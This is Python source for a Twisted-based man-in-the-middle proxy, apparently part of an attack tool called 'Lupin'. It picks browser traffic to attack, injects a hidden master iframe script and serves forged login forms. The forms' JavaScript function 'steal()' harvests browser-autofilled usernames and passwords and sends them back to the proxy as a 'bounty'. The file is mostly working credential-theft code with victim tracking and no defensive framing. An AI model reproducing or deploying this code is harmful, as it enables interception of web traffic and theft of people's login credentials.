
import urlparse, os, sys, random, time
from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory
from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from PersistentData import PersistentData

class ClientRequest(Request):

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       	     = reactor
        self.PersistentData      = PersistentData.getInstance()
   
    def lupinRequest(self,host):
        return defer.succeed(host)

    def resolveHost(self, host):
        if host in self.PersistentData.dnsCache:
            return defer.succeed(self.PersistentData.dnsCache[host])
        else:
            return reactor.resolve(host)

    def errorResolvingHost(self, error):
        #self.setResponseCode(404, "Not Found")
        #self.setHeader("Connection", "close")  
        self.shutDown()

    def process(self):
        host        = self.getHeader('host') 
        path        = self.getPath()       	
        
        if self.PersistentData._LUPIN_TOKEN in path:
            deferred = self.lupinRequest(host)
            deferred.addCallback(self.processLupinRequest)
        else:
            deferred = self.resolveHost(host)
            deferred.addCallback(self.processUserRequest)
            deferred.addErrback(self.errorResolvingHost)
    
    
    def processLupinRequest(self, host):
        
        path        = self.getPath()
	    
        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._FRAME in path:
            self.sendMasterIframe()
            return	


        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._FORGERY in path:     
            self.sendForgedResponse(host) 
            return

        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY in path:
            self.saveBounty()	
            self.sendMoveSlaveSrc()
            return

        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._DESTRUCT in path:
            self.sendSelfDestruct()
            #self.PersistentData.addVictim(self.getClientIP())
            return

        '''
        if self.PersistentData._LUPIN_TOKEN+self.PersistentData._ALIVE in path:
            self.sendAlive()
            #self.PersistentData.addVictim(self.getClientIP())
            return				
        '''

    def processUserRequest(self, address):
        host              = self.getHeader("host")
        path              = self.getPath()      
        headers           = self.stripEncodingHeader()
        self.content.seek(0,0)
        postData          = self.content.read()
        actAs			  = self.proxyBehavior(host,path) 
        
        self.PersistentData.addDnsCache(host, address)
	
        if actAs == self.PersistentData._404:
            self.send404(host)
            return
        
        self.proxyRequest(address, self.method, path, postData, actAs, headers)           



    def proxyBehavior(self,host,path):
      
        client            = self.getClientIP()  
        agent             = self.getHeader("user-agent").upper()

		
        if "CHROME/" not in agent and "FIREFOX/" not in agent:
            return self.PersistentData._PROXY
  
        if self.PersistentData.oldVictim(client):
            print "old news"
            return self.PersistentData._PROXY

        if self.method != "GET":
            return self.PersistentData._PROXY

        lastAttack = 0
        if client in self.PersistentData.lastAttackTime:
            lastAttack = self.PersistentData.lastAttackTime[client]
        if time.time() - lastAttack < 10:
            return self.PersistentData._PROXY
		
        if "google-analytics" in host or "favicon.ico" in path:
            return self.PersistentData._404

        if len(path) > 50:
            return self.PersistentData._PROXY
	
        if "google" in host and "/complete/search?" in path:
            return self.PersistentData._PROXY

        if '.' in path and ".html" not in path and ".php" not in path:
            return self.PersistentData._PROXY
	
        return self.PersistentData._LUPIN



    def proxyRequest(self, host, method, path, postData,actAs,headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)
      

    def saveBounty(self):
        path 	= self.getPath()
        k 	= path.find(self.PersistentData._LUPIN_TOKEN)
        print path[k+len(self.PersistentData._LUPIN_TOKEN)+2:]
        bounty = open("bounty.txt",'a');
        #bounty.write(path[k+16:]+'\n')
        bounty.close()

    def sendMoveSlaveSrc(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        self.write("<html><head></head><body><script type='text/javascript'>window.parent.postMessage(window.name, '*');</script></body></html>")  
        self.shutDown() 


		
    def send404(self,host):
        self.setResponseCode(404, "Not Found")
        self.setHeader("Connection", "close")  
        self.write("<html><head></head><body>404"+host+"</body></html>")    
        self.shutDown() 



    def sendSelfDestruct(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 
        self.write("<html><head><script type='text/javascript'>window.parent.postMessage('selfDestruct','*'); </script></head><body></body></html>")
        self.shutDown()   
        print "DONE!!!" 


    def sendForgedResponse(self,host):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        action = self.PersistentData.loginActions[host]
        data = "<html><head></head><body> \
                <form method='POST' action="+action+"> \
                    <input type='text' name='user'/> \
                    <input type='password' name='pass'/> \
                </form> \
                <script type='text/javascript'> \
                    function steal(){ \
                        user=document.getElementsByName('user')[0].value; \
                        pass=document.getElementsByName('pass')[0].value; \
                        host=location.hostname; \
                        if(pass.length > 0){ \
                            src = '?"+self.PersistentData._LUPIN_TOKEN+self.PersistentData._BOUNTY+"='+host+'|'+user+'|'+pass;\
                            document.location.replace(src);\
                        }else{ \
                            window.parent.postMessage(window.name, '*'); \
                        } \
                    } \
                    setTimeout('steal()',100); \
                </script> \
                </body></html>"
        
        self.write(data)
        self.shutDown()
     

    def sendMasterIframe(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        masterIframe_fd = open("Lupin/masterIframe.js",'r+')
        masterIframe =  "<html><head><script type='text/javascript'>"+ self.PersistentData.masterIframeVars + masterIframe_fd.read()+"</script></head><body onload='init();'></body></html>"
        masterIframe_fd.close()
        self.write(masterIframe)
        self.shutDown()
		
		
    def stripEncodingHeader(self):
        headers = self.getAllHeaders().copy()        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        return headers


    def getPath(self):
        if self.uri.startswith("http://"):
            index = self.uri.find('/', 7)
            return self.uri[index:]
        return self.uri        	
		
		
    def shutDown(self):
        try:
            self.finish()
        except RuntimeError:
            pass
			
